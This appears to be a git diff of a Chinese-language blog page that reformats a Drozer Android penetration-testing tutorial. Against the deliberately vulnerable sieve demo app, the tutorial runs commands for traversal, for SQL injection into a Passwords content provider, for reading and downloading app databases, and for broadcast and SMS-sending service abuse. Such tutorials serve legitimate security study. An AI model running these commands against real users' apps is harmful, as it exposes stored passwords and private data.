@@ -399,9 +399,7 @@
 <h3 id="模拟器安装-Drozer"><a href="#模拟器安装-Drozer" class="headerlink" title="模拟器安装 Drozer"></a>模拟器安装 Drozer</h3><p>直接把下载的 agent.apk 拖到模拟器开启就行</p>
 <p><img src="https://i.loli.net/2020/03/25/q5lbu8ojfRL2GkY.png" alt="image-20200325151151218.png"></p>
 <h3 id="本地开启-Drozer"><a href="#本地开启-Drozer" class="headerlink" title="本地开启 Drozer"></a>本地开启 Drozer</h3><h4 id="连接模拟器端口"><a href="#连接模拟器端口" class="headerlink" title="连接模拟器端口"></a>连接模拟器端口</h4><p>这里的62001是夜神模拟器使用的端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:62001</span><br></pre></td></tr></table></figure>
-
-<p>其他模拟器端口参考如下</p>
+<pre><code>adb connect 127.0.0.1:62001</code></pre><p>其他模拟器端口参考如下</p>
 <table>
 <thead>
 <tr>
@@ -438,58 +436,14 @@
 <td>54001</td>
 </tr>
 </tbody></table>
-<h4 id="查看连接连接状态"><a href="#查看连接连接状态" class="headerlink" title="查看连接连接状态"></a>查看连接连接状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>
-
-<h4 id="进入安卓-shell"><a href="#进入安卓-shell" class="headerlink" title="进入安卓 shell"></a>进入安卓 shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br></pre></td></tr></table></figure>
-
-<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>把安卓的41415端口转发到本机的41415端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>
-
-<h4 id="连接-Drozer"><a href="#连接-Drozer" class="headerlink" title="连接 Drozer"></a>连接 Drozer</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drozer console connect</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/03/25/B91X6Ld3pc7sy4u.png" alt="image-20200325151823660.png"></p>
+<h4 id="查看连接连接状态"><a href="#查看连接连接状态" class="headerlink" title="查看连接连接状态"></a>查看连接连接状态</h4><pre><code>adb devices</code></pre><h4 id="进入安卓-shell"><a href="#进入安卓-shell" class="headerlink" title="进入安卓 shell"></a>进入安卓 shell</h4><pre><code>adb shell</code></pre><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>把安卓的41415端口转发到本机的41415端口</p>
+<pre><code>adb forward tcp:31415 tcp:31415</code></pre><h4 id="连接-Drozer"><a href="#连接-Drozer" class="headerlink" title="连接 Drozer"></a>连接 Drozer</h4><pre><code>drozer console connect</code></pre><p><img src="https://i.loli.net/2020/03/25/B91X6Ld3pc7sy4u.png" alt="image-20200325151823660.png"></p>
 <h3 id="Drozer-测试步骤"><a href="#Drozer-测试步骤" class="headerlink" title="Drozer 测试步骤"></a>Drozer 测试步骤</h3><h4 id="获取包名"><a href="#获取包名" class="headerlink" title="获取包名"></a>获取包名</h4><p>-f 后面跟 apk 的名字，这里以 sieve.apk 为例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list -f sieve</span><br></pre></td></tr></table></figure>
-
-<h4 id="获取包的基本信息"><a href="#获取包的基本信息" class="headerlink" title="获取包的基本信息"></a>获取包的基本信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<h4 id="确定攻击面"><a href="#确定攻击面" class="headerlink" title="确定攻击面"></a>确定攻击面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<h4 id="Acitivity"><a href="#Acitivity" class="headerlink" title="Acitivity"></a>Acitivity</h4><h5 id="获取-Activity-信息"><a href="#获取-Activity-信息" class="headerlink" title="获取 Activity 信息"></a>获取 Activity 信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<h5 id="启动-activity"><a href="#启动-activity" class="headerlink" title="启动 activity"></a>启动 activity</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve 活动名称</span><br></pre></td></tr></table></figure>
-
-<h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h4><h5 id="获取-Content-Provider-信息"><a href="#获取-Content-Provider-信息" class="headerlink" title="获取 Content Provider 信息"></a>获取 Content Provider 信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<h5 id="检测目录遍历漏洞"><a href="#检测目录遍历漏洞" class="headerlink" title="检测目录遍历漏洞"></a>检测目录遍历漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<h5 id="检测-SQL-注入漏洞"><a href="#检测-SQL-注入漏洞" class="headerlink" title="检测 SQL 注入漏洞"></a>检测 SQL 注入漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<h5 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h5><p>爆破 uri</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<p>查询 uri</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span><br></pre></td></tr></table></figure>
-
-<h5 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&apos;&quot;</span><br></pre></td></tr></table></figure>
-
-<h5 id="系统文件访问"><a href="#系统文件访问" class="headerlink" title="系统文件访问"></a>系统文件访问</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure>
-
-<h5 id="系统文件下载"><a href="#系统文件下载" class="headerlink" title="系统文件下载"></a>系统文件下载</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data /data/com.mwr.example.sieve/databases/database.db /home/user/database.db</span><br></pre></td></tr></table></figure>
-
-<h4 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h4><h5 id="获取-Broadacast-信息"><a href="#获取-Broadacast-信息" class="headerlink" title="获取 Broadacast 信息"></a>获取 Broadacast 信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info -a com.icenta.sudoku.ui</span><br></pre></td></tr></table></figure>
-
-<h5 id="空-action-攻击"><a href="#空-action-攻击" class="headerlink" title="空 action 攻击"></a>空 action 攻击</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --component com.icenta.sudoku.ui com.heyzap.sdk.ads.PackageAddedReceiver</span><br></pre></td></tr></table></figure>
-
-<h5 id="空-extras-攻击"><a href="#空-extras-攻击" class="headerlink" title="空 extras 攻击"></a>空 extras 攻击</h5><p>这里的 action 需要查看反编译的 AndroidManifest.xml 文件，找出 receiver 对应 的 action</p>
+<pre><code>run app.package.list -f sieve</code></pre><h4 id="获取包的基本信息"><a href="#获取包的基本信息" class="headerlink" title="获取包的基本信息"></a>获取包的基本信息</h4><pre><code>run app.package.info -a com.mwr.example.sieve</code></pre><h4 id="确定攻击面"><a href="#确定攻击面" class="headerlink" title="确定攻击面"></a>确定攻击面</h4><pre><code>run app.package.attacksurface com.mwr.example.sieve</code></pre><h4 id="Acitivity"><a href="#Acitivity" class="headerlink" title="Acitivity"></a>Acitivity</h4><h5 id="获取-Activity-信息"><a href="#获取-Activity-信息" class="headerlink" title="获取 Activity 信息"></a>获取 Activity 信息</h5><pre><code>run app.activity.info -a com.mwr.example.sieve</code></pre><h5 id="启动-activity"><a href="#启动-activity" class="headerlink" title="启动 activity"></a>启动 activity</h5><pre><code>run app.activity.start --component com.mwr.example.sieve 活动名称</code></pre><h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h4><h5 id="获取-Content-Provider-信息"><a href="#获取-Content-Provider-信息" class="headerlink" title="获取 Content Provider 信息"></a>获取 Content Provider 信息</h5><pre><code>run app.provider.info -a com.mwr.example.sieve</code></pre><h5 id="检测目录遍历漏洞"><a href="#检测目录遍历漏洞" class="headerlink" title="检测目录遍历漏洞"></a>检测目录遍历漏洞</h5><pre><code>run scanner.provider.traversal -a com.mwr.example.sieve</code></pre><h5 id="检测-SQL-注入漏洞"><a href="#检测-SQL-注入漏洞" class="headerlink" title="检测 SQL 注入漏洞"></a>检测 SQL 注入漏洞</h5><pre><code>run scanner.provider.traversal -a com.mwr.example.sieve</code></pre><h5 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h5><p>爆破 uri</p>
+<pre><code>run scanner.provider.finduris -a com.mwr.example.sieve</code></pre><p>查询 uri</p>
+<pre><code>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</code></pre><h5 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h5><pre><code>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;</code></pre><h5 id="系统文件访问"><a href="#系统文件访问" class="headerlink" title="系统文件访问"></a>系统文件访问</h5><pre><code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code></pre><h5 id="系统文件下载"><a href="#系统文件下载" class="headerlink" title="系统文件下载"></a>系统文件下载</h5><pre><code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data /data/com.mwr.example.sieve/databases/database.db /home/user/database.db</code></pre><h4 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h4><h5 id="获取-Broadacast-信息"><a href="#获取-Broadacast-信息" class="headerlink" title="获取 Broadacast 信息"></a>获取 Broadacast 信息</h5><pre><code>run app.broadcast.info -a com.icenta.sudoku.ui</code></pre><h5 id="空-action-攻击"><a href="#空-action-攻击" class="headerlink" title="空 action 攻击"></a>空 action 攻击</h5><pre><code>run app.broadcast.send --component com.icenta.sudoku.ui com.heyzap.sdk.ads.PackageAddedReceiver</code></pre><h5 id="空-extras-攻击"><a href="#空-extras-攻击" class="headerlink" title="空 extras 攻击"></a>空 extras 攻击</h5><p>这里的 action 需要查看反编译的 AndroidManifest.xml 文件，找出 receiver 对应 的 action</p>
 <p><img src="https://i.loli.net/2020/03/25/f3G4uYmxsiaUZgK.png" alt="image-20200325164738846.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action android.intent.action.PACKAGE_ADDED</span><br></pre></td></tr></table></figure>
-
-<h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><h5 id="获取-Service-信息"><a href="#获取-Service-信息" class="headerlink" title="获取 Service 信息"></a>获取 Service 信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<h5 id="权限提升（未试验）"><a href="#权限提升（未试验）" class="headerlink" title="权限提升（未试验）"></a>权限提升（未试验）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 1 --extra string text 1 --extra string OP SEND_SMS</span><br></pre></td></tr></table></figure>
-
-
+<pre><code>run app.broadcast.send --action android.intent.action.PACKAGE_ADDED</code></pre><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><h5 id="获取-Service-信息"><a href="#获取-Service-信息" class="headerlink" title="获取 Service 信息"></a>获取 Service 信息</h5><pre><code>run app.service.info -a com.mwr.example.sieve</code></pre><h5 id="权限提升（未试验）"><a href="#权限提升（未试验）" class="headerlink" title="权限提升（未试验）"></a>权限提升（未试验）</h5><pre><code>run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 1 --extra string text 1 --extra string OP SEND_SMS</code></pre>
       
     </div>
     
@@ -613,7 +567,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -626,7 +580,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -717,6 +671,17 @@
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 -->
 
+
+
+
+
+<!-- Highlight.js -->
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
 
         
